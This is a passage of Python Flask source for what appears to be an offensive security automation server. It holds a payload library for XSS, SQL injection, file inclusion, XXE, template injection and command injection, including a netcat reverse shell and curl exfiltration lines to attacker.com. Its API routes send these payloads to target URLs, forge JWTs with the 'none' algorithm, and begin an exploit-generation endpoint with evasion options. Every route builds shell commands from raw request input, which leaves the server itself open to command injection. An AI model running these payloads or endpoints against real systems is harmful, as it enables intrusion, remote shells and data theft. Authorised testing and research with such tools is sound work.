                    "<body onload=alert('XSS')>"
                ],
                "bypass": [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<img src=\"javascript:alert('XSS')\">",
                    "<svg/onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<details ontoggle=alert('XSS')>"
                ]
            },
            "sqli": {
                "basic": ["' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--"],
                "advanced": [
                    "' UNION SELECT 1,2,3,4,5--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' AND (SELECT SUBSTRING(@@version,1,10))='Microsoft'--",
                    "'; EXEC xp_cmdshell('whoami')--",
                    "' OR 1=1 LIMIT 1--",
                    "' AND 1=(SELECT COUNT(*) FROM tablenames)--"
                ],
                "time_based": [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' OR (SELECT SLEEP(5))--",
                    "'; SELECT pg_sleep(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
                ]
            },
            "lfi": {
                "basic": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
                "advanced": [
                    "....//....//....//etc/passwd",
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
                    "/var/log/apache2/access.log",
                    "/proc/self/environ",
                    "/etc/passwd%00"
                ]
            },
            "cmd_injection": {
                "basic": ["; whoami", "| whoami", "& whoami", "`whoami`"],
                "advanced": [
                    "; cat /etc/passwd",
                    "| nc -e /bin/bash attacker.com 4444",
                    "&& curl http://attacker.com/$(whoami)",
                    "`curl http://attacker.com/$(id)`"
                ]
            },
            "xxe": {
                "basic": [
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>"
                ]
            },
            "ssti": {
                "basic": ["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>"],
                "advanced": [
                    "{{config}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}"
                ]
            }
        }
    
    def generate_contextual_payload(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate contextual payloads based on target information"""
        
        attack_type = target_info.get("attack_type", "xss")
        complexity = target_info.get("complexity", "basic")
        target_tech = target_info.get("technology", "").lower()
        
        # Get base payloads
        payloads = self._get_payloads(attack_type, complexity)
        
        # Enhance payloads with context
        enhanced_payloads = self._enhance_with_context(payloads, target_tech)
        
        # Generate test cases
        test_cases = self._generate_test_cases(enhanced_payloads, attack_type)
        
        return {
            "attack_type": attack_type,
            "complexity": complexity,
            "payload_count": len(enhanced_payloads),
            "payloads": enhanced_payloads,
            "test_cases": test_cases,
            "recommendations": self._get_recommendations(attack_type)
        }
    
    def _get_payloads(self, attack_type: str, complexity: str) -> list:
        """Get payloads for specific attack type and complexity"""
        if attack_type in self.payload_templates:
            if complexity in self.payload_templates[attack_type]:
                return self.payload_templates[attack_type][complexity]
            else:
                # Return basic payloads if complexity not found
                return self.payload_templates[attack_type].get("basic", [])
        
        return ["<!-- No payloads available for this attack type -->"]
    
    def _enhance_with_context(self, payloads: list, tech_context: str) -> list:
        """Enhance payloads with contextual information"""
        enhanced = []
        
        for payload in payloads:
            # Basic payload
            enhanced.append({
                "payload": payload,
                "context": "basic",
                "encoding": "none",
                "risk_level": self._assess_risk_level(payload)
            })
            
            # URL encoded version
            url_encoded = payload.replace(" ", "%20").replace("<", "%3C").replace(">", "%3E")
            enhanced.append({
                "payload": url_encoded,
                "context": "url_encoded",
                "encoding": "url",
                "risk_level": self._assess_risk_level(payload)
            })
        
        return enhanced
    
    def _generate_test_cases(self, payloads: list, attack_type: str) -> list:
        """Generate test cases for the payloads"""
        test_cases = []
        
        for i, payload_info in enumerate(payloads[:5]):  # Limit to 5 test cases
            test_case = {
                "id": f"test_{i+1}",
                "payload": payload_info["payload"],
                "method": "GET" if len(payload_info["payload"]) < 100 else "POST",
                "expected_behavior": self._get_expected_behavior(attack_type),
                "risk_level": payload_info["risk_level"]
            }
            test_cases.append(test_case)
        
        return test_cases
    
    def _get_expected_behavior(self, attack_type: str) -> str:
        """Get expected behavior for attack type"""
        behaviors = {
            "xss": "JavaScript execution or popup alert",
            "sqli": "Database error or data extraction",
            "lfi": "File content disclosure",
            "cmd_injection": "Command execution on server",
            "ssti": "Template expression evaluation",
            "xxe": "XML external entity processing"
        }
        return behaviors.get(attack_type, "Unexpected application behavior")
    
    def _assess_risk_level(self, payload: str) -> str:
        """Assess risk level of payload"""
        high_risk_indicators = ["system", "exec", "eval", "cmd", "shell", "passwd", "etc"]
        medium_risk_indicators = ["script", "alert", "union", "select"]
        
        payload_lower = payload.lower()
        
        if any(indicator in payload_lower for indicator in high_risk_indicators):
            return "HIGH"
        elif any(indicator in payload_lower for indicator in medium_risk_indicators):
            return "MEDIUM"
        else:
            return "LOW"
    
    def _get_recommendations(self, attack_type: str) -> list:
        """Get testing recommendations"""
        recommendations = {
            "xss": [
                "Test in different input fields and parameters",
                "Try both reflected and stored XSS scenarios",
                "Test with different browsers for compatibility"
            ],
            "sqli": [
                "Test different SQL injection techniques",
                "Try both error-based and blind injection",
                "Test various database-specific payloads"
            ],
            "lfi": [
                "Test various directory traversal depths",
                "Try different encoding techniques",
                "Test for log file inclusion"
            ],
            "cmd_injection": [
                "Test different command separators",
                "Try both direct and blind injection",
                "Test with various payloads for different OS"
            ]
        }
        
        return recommendations.get(attack_type, ["Test thoroughly", "Monitor responses"])

# Global AI payload generator
ai_payload_generator = AIPayloadGenerator()

@app.route("/api/ai/generate_payload", methods=["POST"])
def ai_generate_payload():
    """Generate AI-powered contextual payloads for security testing"""
    try:
        params = request.json
        target_info = {
            "attack_type": params.get("attack_type", "xss"),
            "complexity": params.get("complexity", "basic"),
            "technology": params.get("technology", ""),
            "url": params.get("url", "")
        }
        
        logger.info(f"🤖 Generating AI payloads for {target_info['attack_type']} attack")
        result = ai_payload_generator.generate_contextual_payload(target_info)
        
        logger.info(f"✅ Generated {result['payload_count']} contextual payloads")
        
        return jsonify({
            "success": True,
            "ai_payload_generation": result,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"💥 Error in AI payload generation: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/ai/test_payload", methods=["POST"])
def ai_test_payload():
    """Test generated payload against target with AI analysis"""
    try:
        params = request.json
        payload = params.get("payload", "")
        target_url = params.get("target_url", "")
        method = params.get("method", "GET")
        
        if not payload or not target_url:
            return jsonify({
                "success": False,
                "error": "Payload and target_url are required"
            }), 400
        
        logger.info(f"🧪 Testing AI-generated payload against {target_url}")
        
        # Create test command based on method and payload
        if method.upper() == "GET":
            encoded_payload = payload.replace(" ", "%20").replace("'", "%27")
            test_command = f"curl -s '{target_url}?test={encoded_payload}'"
        else:
            test_command = f"curl -s -X POST -d 'test={payload}' '{target_url}'"
        
        # Execute test
        result = execute_command(test_command, use_cache=False)
        
        # AI analysis of results
        analysis = {
            "payload_tested": payload,
            "target_url": target_url,
            "method": method,
            "response_size": len(result.get("stdout", "")),
            "success": result.get("success", False),
            "potential_vulnerability": payload.lower() in result.get("stdout", "").lower(),
            "recommendations": [
                "Analyze response for payload reflection",
                "Check for error messages indicating vulnerability",
                "Monitor application behavior changes"
            ]
        }
        
        logger.info(f"🔍 Payload test completed | Potential vuln: {analysis['potential_vulnerability']}")
        
        return jsonify({
            "success": True,
            "test_result": result,
            "ai_analysis": analysis,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"💥 Error in AI payload testing: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ADVANCED API TESTING TOOLS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/tools/api_fuzzer", methods=["POST"])
def api_fuzzer():
    """Advanced API endpoint fuzzing with intelligent parameter discovery"""
    try:
        params = request.json
        base_url = params.get("base_url", "")
        endpoints = params.get("endpoints", [])
        methods = params.get("methods", ["GET", "POST", "PUT", "DELETE"])
        wordlist = params.get("wordlist", "/usr/share/wordlists/api/api-endpoints.txt")
        
        if not base_url:
            logger.warning("🌐 API Fuzzer called without base_url parameter")
            return jsonify({
                "error": "Base URL parameter is required"
            }), 400
        
        # Create comprehensive API fuzzing command
        if endpoints:
            # Test specific endpoints
            results = []
            for endpoint in endpoints:
                for method in methods:
                    test_url = f"{base_url.rstrip('/')}/{endpoint.lstrip('/')}"
                    command = f"curl -s -X {method} -w '%{{http_code}}|%{{size_download}}' '{test_url}'"
                    result = execute_command(command, use_cache=False)
                    results.append({
                        "endpoint": endpoint,
                        "method": method,
                        "result": result
                    })
            
            logger.info(f"🔍 API endpoint testing completed for {len(endpoints)} endpoints")
            return jsonify({
                "success": True,
                "fuzzing_type": "endpoint_testing",
                "results": results
            })
        else:
            # Discover endpoints using wordlist
            command = f"ffuf -u {base_url}/FUZZ -w {wordlist} -mc 200,201,202,204,301,302,307,401,403,405 -t 50"
            
            logger.info(f"🔍 Starting API endpoint discovery: {base_url}")
            result = execute_command(command)
            logger.info(f"📊 API endpoint discovery completed")
            
            return jsonify({
                "success": True,
                "fuzzing_type": "endpoint_discovery",
                "result": result
            })
        
    except Exception as e:
        logger.error(f"💥 Error in API fuzzer: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/graphql_scanner", methods=["POST"])
def graphql_scanner():
    """Advanced GraphQL security scanning and introspection"""
    try:
        params = request.json
        endpoint = params.get("endpoint", "")
        introspection = params.get("introspection", True)
        query_depth = params.get("query_depth", 10)
        mutations = params.get("test_mutations", True)
        
        if not endpoint:
            logger.warning("🌐 GraphQL Scanner called without endpoint parameter")
            return jsonify({
                "error": "GraphQL endpoint parameter is required"
            }), 400
        
        logger.info(f"🔍 Starting GraphQL security scan: {endpoint}")
        
        results = {
            "endpoint": endpoint,
            "tests_performed": [],
            "vulnerabilities": [],
            "recommendations": []
        }
        
        # Test 1: Introspection query
        if introspection:
            introspection_query = '''
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                            type {
                                name
                            }
                        }
                    }
                }
            }
            '''
            
            clean_query = introspection_query.replace('\n', ' ').replace('  ', ' ').strip()
            command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{clean_query}\"}}' '{endpoint}'"
            result = execute_command(command, use_cache=False)
            
            results["tests_performed"].append("introspection_query")
            
            if "data" in result.get("stdout", ""):
                results["vulnerabilities"].append({
                    "type": "introspection_enabled",
                    "severity": "MEDIUM",
                    "description": "GraphQL introspection is enabled"
                })
        
        # Test 2: Query depth analysis
        deep_query = "{ " * query_depth + "field" + " }" * query_depth
        command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{deep_query}\"}}' {endpoint}"
        depth_result = execute_command(command, use_cache=False)
        
        results["tests_performed"].append("query_depth_analysis")
        
        if "error" not in depth_result.get("stdout", "").lower():
            results["vulnerabilities"].append({
                "type": "no_query_depth_limit",
                "severity": "HIGH",
                "description": f"No query depth limiting detected (tested depth: {query_depth})"
            })
        
        # Test 3: Batch query testing
        batch_query = '[' + ','.join(['{\"query\":\"{field}\"}' for _ in range(10)]) + ']'
        command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{batch_query}' {endpoint}"
        batch_result = execute_command(command, use_cache=False)
        
        results["tests_performed"].append("batch_query_testing")
        
        if "data" in batch_result.get("stdout", "") and batch_result.get("success"):
            results["vulnerabilities"].append({
                "type": "batch_queries_allowed",
                "severity": "MEDIUM",
                "description": "Batch queries are allowed without rate limiting"
            })
        
        # Generate recommendations
        if results["vulnerabilities"]:
            results["recommendations"] = [
                "Disable introspection in production",
                "Implement query depth limiting",
                "Add rate limiting for batch queries",
                "Implement query complexity analysis",
                "Add authentication for sensitive operations"
            ]
        
        logger.info(f"📊 GraphQL scan completed | Vulnerabilities found: {len(results['vulnerabilities'])}")
        
        return jsonify({
            "success": True,
            "graphql_scan_results": results
        })
        
    except Exception as e:
        logger.error(f"💥 Error in GraphQL scanner: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/jwt_analyzer", methods=["POST"])
def jwt_analyzer():
    """Advanced JWT token analysis and vulnerability testing"""
    try:
        params = request.json
        jwt_token = params.get("jwt_token", "")
        target_url = params.get("target_url", "")
        
        if not jwt_token:
            logger.warning("🔐 JWT Analyzer called without jwt_token parameter")
            return jsonify({
                "error": "JWT token parameter is required"
            }), 400
        
        logger.info(f"🔍 Starting JWT security analysis")
        
        results = {
            "token": jwt_token[:50] + "..." if len(jwt_token) > 50 else jwt_token,
            "vulnerabilities": [],
            "token_info": {},
            "attack_vectors": []
        }
        
        # Decode JWT header and payload (basic analysis)
        try:
            parts = jwt_token.split('.')
            if len(parts) >= 2:
                # Decode header
                import base64
                import json
                
                # Add padding if needed
                header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
                payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
                
                try:
                    header = json.loads(base64.b64decode(header_b64))
                    payload = json.loads(base64.b64decode(payload_b64))
                    
                    results["token_info"] = {
                        "header": header,
                        "payload": payload,
                        "algorithm": header.get("alg", "unknown")
                    }
                    
                    # Check for vulnerabilities
                    algorithm = header.get("alg", "").lower()
                    
                    if algorithm == "none":
                        results["vulnerabilities"].append({
                            "type": "none_algorithm",
                            "severity": "CRITICAL",
                            "description": "JWT uses 'none' algorithm - no signature verification"
                        })
                    
                    if algorithm in ["hs256", "hs384", "hs512"]:
                        results["attack_vectors"].append("hmac_key_confusion")
                        results["vulnerabilities"].append({
                            "type": "hmac_algorithm",
                            "severity": "MEDIUM",
                            "description": "HMAC algorithm detected - vulnerable to key confusion attacks"
                        })
                    
                    # Check token expiration
                    exp = payload.get("exp")
                    if not exp:
                        results["vulnerabilities"].append({
                            "type": "no_expiration",
                            "severity": "HIGH",
                            "description": "JWT token has no expiration time"
                        })
                    
                except Exception as decode_error:
                    results["vulnerabilities"].append({
                        "type": "malformed_token",
                        "severity": "HIGH",
                        "description": f"Token decoding failed: {str(decode_error)}"
                    })
        
        except Exception as e:
            results["vulnerabilities"].append({
                "type": "invalid_format",
                "severity": "HIGH",
                "description": "Invalid JWT token format"
            })
        
        # Test token manipulation if target URL provided
        if target_url:
            # Test none algorithm attack
            none_token_parts = jwt_token.split('.')
            if len(none_token_parts) >= 2:
                # Create none algorithm token
                none_header = base64.b64encode('{"alg":"none","typ":"JWT"}'.encode()).decode().rstrip('=')
                none_token = f"{none_header}.{none_token_parts[1]}."
                
                command = f"curl -s -H 'Authorization: Bearer {none_token}' '{target_url}'"
                none_result = execute_command(command, use_cache=False)
                
                if "200" in none_result.get("stdout", "") or "success" in none_result.get("stdout", "").lower():
                    results["vulnerabilities"].append({
                        "type": "none_algorithm_accepted",
                        "severity": "CRITICAL",
                        "description": "Server accepts tokens with 'none' algorithm"
                    })
        
        logger.info(f"📊 JWT analysis completed | Vulnerabilities found: {len(results['vulnerabilities'])}")
        
        return jsonify({
            "success": True,
            "jwt_analysis_results": results
        })
        
    except Exception as e:
        logger.error(f"💥 Error in JWT analyzer: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/api_schema_analyzer", methods=["POST"])
def api_schema_analyzer():
    """Analyze API schemas and identify potential security issues"""
    try:
        params = request.json
        schema_url = params.get("schema_url", "")
        schema_type = params.get("schema_type", "openapi")  # openapi, swagger, graphql
        
        if not schema_url:
            logger.warning("📋 API Schema Analyzer called without schema_url parameter")
            return jsonify({
                "error": "Schema URL parameter is required"
            }), 400
        
        logger.info(f"🔍 Starting API schema analysis: {schema_url}")
        
        # Fetch schema
        command = f"curl -s '{schema_url}'"
        result = execute_command(command, use_cache=True)
        
        if not result.get("success"):
            return jsonify({
                "error": "Failed to fetch API schema"
            }), 400
        
        schema_content = result.get("stdout", "")
        
        analysis_results = {
            "schema_url": schema_url,
            "schema_type": schema_type,
            "endpoints_found": [],
            "security_issues": [],
            "recommendations": []
        }
        
        # Parse schema based on type
        try:
            import json
            schema_data = json.loads(schema_content)
            
            if schema_type.lower() in ["openapi", "swagger"]:
                # OpenAPI/Swagger analysis
                paths = schema_data.get("paths", {})
                
                for path, methods in paths.items():
                    for method, details in methods.items():
                        if isinstance(details, dict):
                            endpoint_info = {
                                "path": path,
                                "method": method.upper(),
                                "summary": details.get("summary", ""),
                                "parameters": details.get("parameters", []),
                                "security": details.get("security", [])
                            }
                            analysis_results["endpoints_found"].append(endpoint_info)
                            
                            # Check for security issues
                            if not endpoint_info["security"]:
                                analysis_results["security_issues"].append({
                                    "endpoint": f"{method.upper()} {path}",
                                    "issue": "no_authentication",
                                    "severity": "MEDIUM",
                                    "description": "Endpoint has no authentication requirements"
                                })
                            
                            # Check for sensitive data in parameters
                            for param in endpoint_info["parameters"]:
                                param_name = param.get("name", "").lower()
                                if any(sensitive in param_name for sensitive in ["password", "token", "key", "secret"]):
                                    analysis_results["security_issues"].append({
                                        "endpoint": f"{method.upper()} {path}",
                                        "issue": "sensitive_parameter",
                                        "severity": "HIGH",
                                        "description": f"Sensitive parameter detected: {param_name}"
                                    })
            
            # Generate recommendations
            if analysis_results["security_issues"]:
                analysis_results["recommendations"] = [
                    "Implement authentication for all endpoints",
                    "Use HTTPS for all API communications",
                    "Validate and sanitize all input parameters",
                    "Implement rate limiting",
                    "Add proper error handling",
                    "Use secure headers (CORS, CSP, etc.)"
                ]
            
        except json.JSONDecodeError:
            analysis_results["security_issues"].append({
                "endpoint": "schema",
                "issue": "invalid_json",
                "severity": "HIGH",
                "description": "Schema is not valid JSON"
            })
        
        logger.info(f"📊 Schema analysis completed | Issues found: {len(analysis_results['security_issues'])}")
        
        return jsonify({
            "success": True,
            "schema_analysis_results": analysis_results
        })
        
    except Exception as e:
        logger.error(f"💥 Error in API schema analyzer: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ADVANCED CTF TOOLS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/tools/volatility3", methods=["POST"])
def volatility3():
    """Execute Volatility3 for advanced memory forensics with enhanced logging"""
    try:
        params = request.json
        memory_file = params.get("memory_file", "")
        plugin = params.get("plugin", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")
        
        if not memory_file:
            logger.warning("🧠 Volatility3 called without memory_file parameter")
            return jsonify({
                "error": "Memory file parameter is required"
            }), 400
            
        if not plugin:
            logger.warning("🧠 Volatility3 called without plugin parameter")
            return jsonify({
                "error": "Plugin parameter is required"
            }), 400
        
        command = f"vol.py -f {memory_file} {plugin}"
        
        if output_file:
            command += f" -o {output_file}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🧠 Starting Volatility3 analysis: {plugin}")
        result = execute_command(command)
        logger.info(f"📊 Volatility3 analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in volatility3 endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/foremost", methods=["POST"])
def foremost():
    """Execute Foremost for file carving with enhanced logging"""
    try:
        params = request.json
        input_file = params.get("input_file", "")
        output_dir = params.get("output_dir", "/tmp/foremost_output")
        file_types = params.get("file_types", "")
        additional_args = params.get("additional_args", "")
        
        if not input_file:
            logger.warning("📁 Foremost called without input_file parameter")
            return jsonify({
                "error": "Input file parameter is required"
            }), 400
        
        # Ensure output directory exists
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        
        command = f"foremost -o {output_dir}"
        
        if file_types:
            command += f" -t {file_types}"
            
        if additional_args:
            command += f" {additional_args}"
            
        command += f" {input_file}"
        
        logger.info(f"📁 Starting Foremost file carving: {input_file}")
        result = execute_command(command)
        result["output_directory"] = output_dir
        logger.info(f"📊 Foremost carving completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in foremost endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/steghide", methods=["POST"])
def steghide():
    """Execute Steghide for steganography analysis with enhanced logging"""
    try:
        params = request.json
        action = params.get("action", "extract")  # extract, embed, info
        cover_file = params.get("cover_file", "")
        embed_file = params.get("embed_file", "")
        passphrase = params.get("passphrase", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")
        
        if not cover_file:
            logger.warning("🖼️ Steghide called without cover_file parameter")
            return jsonify({
                "error": "Cover file parameter is required"
            }), 400
        
        if action == "extract":
            command = f"steghide extract -sf {cover_file}"
            if output_file:
                command += f" -xf {output_file}"
        elif action == "embed":
            if not embed_file:
                return jsonify({"error": "Embed file required for embed action"}), 400
            command = f"steghide embed -cf {cover_file} -ef {embed_file}"
        elif action == "info":
            command = f"steghide info {cover_file}"
        else:
            return jsonify({"error": "Invalid action. Use: extract, embed, info"}), 400
            
        if passphrase:
            command += f" -p {passphrase}"
        else:
            command += " -p ''"  # Empty passphrase
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🖼️ Starting Steghide {action}: {cover_file}")
        result = execute_command(command)
        logger.info(f"📊 Steghide {action} completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in steghide endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/exiftool", methods=["POST"])
def exiftool():
    """Execute ExifTool for metadata extraction with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        output_format = params.get("output_format", "")  # json, xml, csv
        tags = params.get("tags", "")
        additional_args = params.get("additional_args", "")
        
        if not file_path:
            logger.warning("📷 ExifTool called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400
        
        command = f"exiftool"
        
        if output_format:
            command += f" -{output_format}"
            
        if tags:
            command += f" -{tags}"
            
        if additional_args:
            command += f" {additional_args}"
            
        command += f" {file_path}"
        
        logger.info(f"📷 Starting ExifTool analysis: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 ExifTool analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in exiftool endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/hashpump", methods=["POST"])
def hashpump():
    """Execute HashPump for hash length extension attacks with enhanced logging"""
    try:
        params = request.json
        signature = params.get("signature", "")
        data = params.get("data", "")
        key_length = params.get("key_length", "")
        append_data = params.get("append_data", "")
        additional_args = params.get("additional_args", "")
        
        if not all([signature, data, key_length, append_data]):
            logger.warning("🔐 HashPump called without required parameters")
            return jsonify({
                "error": "Signature, data, key_length, and append_data parameters are required"
            }), 400
        
        command = f"hashpump -s {signature} -d '{data}' -k {key_length} -a '{append_data}'"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔐 Starting HashPump attack")
        result = execute_command(command)
        logger.info(f"📊 HashPump attack completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hashpump endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# BUG BOUNTY RECONNAISSANCE TOOLS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/tools/hakrawler", methods=["POST"])
def hakrawler():
    """Execute Hakrawler for web endpoint discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        depth = params.get("depth", 2)
        forms = params.get("forms", True)
        robots = params.get("robots", True)
        sitemap = params.get("sitemap", True)
        wayback = params.get("wayback", False)
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("🕷️ Hakrawler called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        command = f"hakrawler -url {url} -depth {depth}"
        
        if forms:
            command += " -forms"
        if robots:
            command += " -robots"
        if sitemap:
            command += " -sitemap"
        if wayback:
            command += " -wayback"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🕷️ Starting Hakrawler crawling: {url}")
        result = execute_command(command)
        logger.info(f"📊 Hakrawler crawling completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hakrawler endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/httpx", methods=["POST"])
def httpx():
    """Execute HTTPx for HTTP probing with enhanced logging"""
    try:
        params = request.json
        targets = params.get("targets", "")
        target_file = params.get("target_file", "")
        ports = params.get("ports", "")
        methods = params.get("methods", "GET")
        status_code = params.get("status_code", "")
        content_length = params.get("content_length", False)
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")
        
        if not targets and not target_file:
            logger.warning("🌐 HTTPx called without targets or target_file parameter")
            return jsonify({
                "error": "Either targets or target_file parameter is required"
            }), 400
        
        command = "httpx"
        
        if targets:
            command += f" -u {targets}"
        if target_file:
            command += f" -l {target_file}"
        if ports:
            command += f" -p {ports}"
        if methods:
            command += f" -X {methods}"
        if status_code:
            command += f" -mc {status_code}"
        if content_length:
            command += " -cl"
        if output_file:
            command += f" -o {output_file}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🌐 Starting HTTPx probing")
        result = execute_command(command)
        logger.info(f"📊 HTTPx probing completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in httpx endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/paramspider", methods=["POST"])
def paramspider():
    """Execute ParamSpider for parameter discovery with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        exclude = params.get("exclude", "")
        output_file = params.get("output_file", "")
        level = params.get("level", 2)
        additional_args = params.get("additional_args", "")
        
        if not domain:
            logger.warning("🔍 ParamSpider called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400
        
        command = f"paramspider -d {domain} -l {level}"
        
        if exclude:
            command += f" -e {exclude}"
        if output_file:
            command += f" -o {output_file}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting ParamSpider discovery: {domain}")
        result = execute_command(command)
        logger.info(f"📊 ParamSpider discovery completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in paramspider endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ADVANCED VULNERABILITY INTELLIGENCE API ENDPOINTS (v6.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/vuln-intel/cve-monitor", methods=["POST"])
def cve_monitor():
    """Monitor CVE databases for new vulnerabilities with AI analysis"""
    try:
        params = request.json
        hours = params.get("hours", 24)
        severity_filter = params.get("severity_filter", "HIGH,CRITICAL")
        keywords = params.get("keywords", "")
        
        logger.info(f"🔍 Monitoring CVE feeds for last {hours} hours with severity filter: {severity_filter}")
        
        # Fetch latest CVEs
        cve_results = cve_intelligence.fetch_latest_cves(hours, severity_filter)
        
        # Filter by keywords if provided
        if keywords and cve_results.get("success"):
            keyword_list = [k.strip().lower() for k in keywords.split(",")]
            filtered_cves = []
            
            for cve in cve_results.get("cves", []):
                description = cve.get("description", "").lower()
                if any(keyword in description for keyword in keyword_list):
                    filtered_cves.append(cve)
            
            cve_results["cves"] = filtered_cves
            cve_results["filtered_by_keywords"] = keywords
            cve_results["total_after_filter"] = len(filtered_cves)
        
        # Analyze exploitability for top CVEs
        exploitability_analysis = []
        for cve in cve_results.get("cves", [])[:5]:  # Analyze top 5 CVEs
            cve_id = cve.get("cve_id", "")
            if cve_id:
                analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
                if analysis.get("success"):
                    exploitability_analysis.append(analysis)
        
        result = {
            "success": True,
            "cve_monitoring": cve_results,
            "exploitability_analysis": exploitability_analysis,
            "timestamp": datetime.now().isoformat()
        }
        
        logger.info(f"📊 CVE monitoring completed | Found: {len(cve_results.get('cves', []))} CVEs")
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"💥 Error in CVE monitoring: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/exploit-generate", methods=["POST"])
def exploit_generate():
    """Generate exploits from vulnerability data using AI"""
    try:
        params = request.json
        cve_id = params.get("cve_id", "")
        target_os = params.get("target_os", "")
        target_arch = params.get("target_arch", "x64")
        exploit_type = params.get("exploit_type", "poc")
        evasion_level = params.get("evasion_level", "none")
        
        # Additional target context
        target_info = {
            "target_os": target_os,
            "target_arch": target_arch,
            "exploit_type": exploit_type,
            "evasion_level": evasion_level,
            "target_ip": params.get("target_ip", "192.168.1.100"),
            "target_port": params.get("target_port", 80),
            "description": params.get("target_description", f"Target for {cve_id}")
        }
        
        if not cve_id:
            logger.warning("🤖 Exploit generation called without CVE ID")
            return jsonify({
                "success": False,
                "error": "CVE ID parameter is required"
            }), 400
        
        logger.info(f"🤖 Generating exploit for {cve_id} | Target: {target_os} {target_arch}")
        
        # First analyze the CVE for context
        cve_analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
        
        if not cve_analysis.get("success"):
            return jsonify({
                "success": False,
                "error": f"Failed to analyze CVE {cve_id}: {cve_analysis.get('error', 'Unknown error')}"
            }), 400
        
        # Prepare CVE data for exploit generation
        cve_data = {
            "cve_id": cve_id,
            "description": f"Vulnerability analysis for {cve_id}",
            "exploitability_level": cve_analysis.get("exploitability_level", "UNKNOWN"),
            "exploitability_score": cve_analysis.get("exploitability_score", 0)
        }
        
